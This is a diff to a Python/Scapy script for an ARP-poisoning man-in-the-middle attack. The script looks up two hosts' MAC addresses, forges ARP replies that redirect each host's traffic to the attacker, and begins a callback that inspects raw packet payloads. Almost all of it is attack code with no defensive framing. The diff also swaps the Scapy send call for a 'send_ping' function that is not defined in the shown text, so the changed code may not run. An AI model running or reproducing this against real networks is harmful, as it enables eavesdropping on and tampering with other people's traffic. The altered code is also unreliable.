@@ -24,8 +24,8 @@ host_a_mac = get_mac(HOST_A_IP)
 host_b_mac = get_mac(HOST_B_IP)
 
 print("Attacker MAC: " + attacker_mac)
-print("Host A MAC: + " + host_a_mac)
-print("Host B MAC: + " + host_b_mac)
+print("Host A MAC: " + host_a_mac)
+print("Host B MAC: " + host_b_mac)
 
 if not host_a_mac or not host_b_mac:
     print("oops")
@@ -49,8 +49,8 @@ print("step 3: mitm")
 poison_frame_a = Ether(dst=host_a_mac, src=attacker_mac)/ARP(op=2, hwsrc=attacker_mac, psrc=HOST_B_IP, hwdst=host_a_mac, pdst=HOST_A_IP)
 poison_frame_b = Ether(dst=host_b_mac, src=attacker_mac)/ARP(op=2, hwsrc=attacker_mac, psrc=HOST_A_IP, hwdst=host_b_mac, pdst=HOST_B_IP)
 
-sendp(poison_frame_a)
-sendp(poison_frame_b)
+send_ping(poison_frame_a)
+send_ping(poison_frame_b)
 
 def process_packet(pkt):
     if pkt.haslayer(Raw):
